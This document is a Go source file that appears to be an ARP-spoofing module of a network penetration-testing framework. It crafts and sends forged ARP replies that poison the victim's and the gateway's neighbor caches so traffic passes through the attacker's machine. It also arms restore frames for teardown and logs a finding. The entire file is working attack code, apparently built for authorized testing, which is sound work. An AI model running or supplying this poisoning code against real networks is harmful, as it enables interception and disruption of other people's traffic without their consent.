package fh

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type arpSpoofFinding struct {
	Action  string   `json:"action"`
	Targets []string `json:"targets"`
	Gateway string   `json:"gateway"`
	Restore string   `json:"restore"`
}

// RunARPSpoof sends ARP replies for the fixed victim and gateway pair after
// arming neighbor repairs on the runner's teardown handle. The preceding
// ip-forward-restore step is a no-op because this behavior does not change
// host forwarding. Craft and send failures include operation context.
func RunARPSpoof(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()

	// Arm the teardown steps before the first frame so an interrupted
	// run still restores. The order of Arm calls is the execution order
	// (reverse-dependency: least-dependent first). ip_forward restore is
	// host-local state, independent of the wire; neighbor-cache repairs
	// depend on the attacker's own stack being in a known state, so
	// ip_forward goes first.
	deps.Teardown.Arm("ip-forward-restore", func(_ context.Context) error {
		return nil
	})

	// Pre-build the neighbor repair frames so the teardown step has them.
	victimRepair, err := craftARPRestore(src, victimMAC, victimIP, gwIP, gwMAC)
	if err != nil {
		return fmt.Errorf("arpspoof: craft victim repair: %w", err)
	}
	gwRepair, err := craftARPRestore(src, gwMAC, gwIP, victimIP, victimMAC)
	if err != nil {
		return fmt.Errorf("arpspoof: craft gateway repair: %w", err)
	}
	deps.Teardown.Arm("neighbor-unicast-repair-victim", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, victimRepair)
	})
	deps.Teardown.Arm("neighbor-unicast-repair-gateway", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, gwRepair)
	})

	// Send poison frames: victim→gw (attacker claims to be gw),
	// gw→victim (attacker claims to be victim).
	victimPoison, err := craftARPSpoof(src, victimMAC, victimIP, gwIP)
	if err != nil {
		return fmt.Errorf("arpspoof: craft victim poison: %w", err)
	}
	gwPoison, err := craftARPSpoof(src, gwMAC, gwIP, victimIP)
	if err != nil {
		return fmt.Errorf("arpspoof: craft gateway poison: %w", err)
	}

	if err := deps.AttackLeg.Send(ctx, victimPoison); err != nil {
		return fmt.Errorf("arpspoof: send victim poison: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, gwPoison); err != nil {
		return fmt.Errorf("arpspoof: send gateway poison: %w", err)
	}

	detail, _ := json.Marshal(arpSpoofFinding{
		Action:  "arp-poison",
		Targets: []string{victimIP.String()},
		Gateway: gwIP.String(),
		Restore: "ip-forward-restore + neighbor-unicast-repairs",
	})
	deps.Emitter.Finding("arp", detail)

	return nil
}

// craftARPSpoof builds a unicast ARP reply: "spoofedIP is-at attackerMAC".
func craftARPSpoof(src, dstMAC net.HardwareAddr, dstIP, spoofedIP net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   src,
		SourceProtAddress: spoofedIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craftDefault(eth, arp)
}

// craftARPRestore builds a unicast ARP reply restoring the real MAC mapping.
func craftARPRestore(src, dstMAC net.HardwareAddr, dstIP, srcIP net.IP, realMAC net.HardwareAddr) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   realMAC,
		SourceProtAddress: srcIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craftDefault(eth, arp)
}
